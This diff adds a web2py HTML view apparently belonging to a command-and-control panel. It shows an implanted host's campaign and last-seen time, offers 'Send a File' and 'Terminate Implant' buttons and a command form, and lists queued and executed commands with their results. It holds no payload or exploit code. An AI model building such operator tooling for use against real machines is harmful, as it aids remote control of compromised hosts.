@@ -1,0 +1,75 @@
+{{extend 'layout.html'}}
+{{block header}}
+<div class="jumbotron jumbotron-fluid background" style="background-color: #009deb; color:white; padding:30px;word-wrap:break-word;">
+  <div class="container center">
+    <h1 class="display-5">{{if host.campaign_id>0:}} <a class="text-white" href="{{=URL('campaigns','show',args=host.campaign_id)}}">{{pass}} {{=campaign_name}} > </a>{{=host.name}}</h1>
+    {{if error_message:}}
+        <div class="alert alert-danger" role="alert">{{=error_message}}</div>
+    {{pass}}
+  </div>
+</div>
+{{end}}
+
+      <div class="row">
+          <div class="col-md-6">
+              <h2> Details </h2>
+              <table >
+                  <tr>
+                      <td> <h5>Last seen on: {{=host.last_seen}}</h5></td>
+                  </tr>
+                  <tr>
+                  <td> <h5>Assigned to campaign: {{if host.campaign_id>0:}}
+                                                  <a href="{{=URL('campaigns','show',args=host.campaign_id)}}"> {{=campaign_name}}</a>
+                                                  {{pass}}
+                  </h5></td>
+                  </tr>{{if host.terminated:}}<tr><td><h5>HOST IS TERMINATED</h5></td> </tr><tr><td></td></tr><tr><td></td></tr> </table></div>{{else:}} 
+                  <tr><td><a class="btn btn-primary" href="{{=URL('sendfiles','send',args=host.id)}}">Send a File</a>     <a class="btn btn-danger" href="{{=URL('terminate','index',args=host.id)}}">Terminate Implant</a></td></tr>
+
+                  <tr><td><hr><h5>Add Command</h5>
+             {{=command_form}}</td></tr>
+              </table>
+          </div>{{pass}}
+         <div class="col-md-6">
+             <h2>Queued commands:</h2>
+             {{if len(next_commands)==0:}}
+          <h3> No queued commands </h3>
+        {{else:}}
+             {{=LOAD('hosts', 'queue.load', ajax=True,args=session.campaign_id,times="infinity",timeout=5000)}}
+          {{pass}}
+             <hr>
+         </div>
+      </div>
+      <hr>
+ <div class="row">
+      <div class="col-md-6">
+          <h2>Executed commands:</h2>
+          {{=LOAD('hosts', 'executed.load', ajax=True,args=session.campaign_id,times="infinity",timeout=5000)}}
+     </div>
+     <div class="col-md-6">
+        <h2>Results: </h2>
+         {{if command_result is not None:}}
+          <textarea rows="10" cols="50" readonly>
+             {{=command_result}}
+         </textarea>
+         {{pass}}
+
+     </div>
+</div>
+
+    <div class="jumbotron jumbotron-fluid" style="padding:30px;word-wrap:break-word;">
+      <div class="container center">
+        <a class="btn btn-primary" href="{{=URL('admin','default','index')}}">
+          <i class="fa fa-cog"></i>
+          {{=T("admin")}}
+        </a>
+        <a class="btn btn-secondary" href="{{=URL('examples','default','index')}}">{{=T("Online examples")}}</a>
+        <a class="btn btn-secondary" href="http://web2py.com">web2py.com</a>
+        <a class="btn btn-secondary" href="http://web2py.com/book">{{=T('Documentation')}}</a>
+        <a class="btn btn-secondary" href="{{=URL('default','api_get_user_email')}}">{{=T('API Example')}}</a>
+        <a class="btn btn-secondary" href="{{=URL('default','grid/auth_user')}}">{{=T('Grid Example')}}</a>
+        <a class="btn btn-secondary" href="{{=URL('default','wiki')}}">{{=T('Wiki Example')}}</a>
+      </div>
+    </div>
+
+  </div>
+</div>
